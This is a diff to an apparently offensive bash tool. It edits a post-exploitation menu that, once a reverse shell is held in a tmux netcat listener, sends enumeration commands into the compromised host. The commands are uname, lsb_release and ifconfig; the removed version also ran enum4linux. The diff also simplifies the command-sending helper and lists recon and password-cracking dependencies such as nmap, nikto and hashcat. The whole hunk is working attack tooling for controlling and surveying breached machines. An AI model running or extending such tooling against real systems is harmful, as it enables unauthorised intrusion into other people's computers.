@@ -1870,48 +1870,37 @@ post_exploitation() {
 
     echo -e "${GREEN}[+] Reverse shell obtained. Select a post-exploitation option:${NC}"
     while true; do
-        echo -e "1) Gather System Information (2s)"
-        echo -e "2) Network Interface Information (2s)"
-        echo -e "3) Run enum4linux (5s)"
-        echo -e "4) Back to Main Menu"
+        echo -e "1) Gather System Information"
+        echo -e "2) Network Interface Information"
+        echo -e "3) Back to Main Menu"
         read -p "Select an option: " post_option
 
         case $post_option in
-            1) send_command_with_delay "uname -a && lsb_release -a" 2 ;;
-            2) send_command_with_delay "ifconfig || ip a" 2 ;;
-            3) send_command_with_delay "enum4linux -a" 5 ;;
-            4) break ;;
+            1) send_command "uname -a && lsb_release -a" ;;
+            2) send_command "ifconfig || ip a" ;;
+            3) break ;;
             *) echo -e "${RED}Invalid option. Please try again.${NC}" ;;
         esac
 
+        # Add a slight delay to ensure the command execution is completed
+        sleep 2
+
         # Capture the output from the reverse shell
         tmux capture-pane -t nc_listener -S -1000
-        tmux save-buffer -b nc_listener /$BASE_DIR/privesc/tmux_buffer.txt
-        cat /$BASE_DIR/privesc/tmux_buffer.txt
-        > /$BASE_DIR/privesc/tmux_buffer.txt
+        tmux save-buffer -b nc_listener /tmp/tmux_buffer.txt
+        cat /tmp/tmux_buffer.txt
+        > /tmp/tmux_buffer.txt
     done
 
     # Kill the tmux session after post-exploitation tasks are done
     tmux kill-session -t nc_listener
 }
 
-# Function to send command to the reverse shell and wait
-send_command_with_delay() {
+# Function to send command to the reverse shell
+send_command() {
     local cmd="$1"
-    local delay="$2"
-
     tmux send-keys -t nc_listener "$cmd" C-m
-    echo -e "${YELLOW}[+] Waiting for $delay seconds...${NC}"
-
-    # Countdown timer
-    for ((i = delay; i > 0; i--)); do
-        echo -ne "$i\033[0K\r"
-        sleep 1
-    done
-
-    echo -e "${GREEN}[+] Capturing output...${NC}"
 }
-
 check_install_dependencies() {
     dependencies=("nmap" "whatweb" "nikto" "gobuster" "hashcat" "python3-pip" "finalrecon" "theharvester" "recon-ng" "nuclei" "wkhtmltopdf")
 
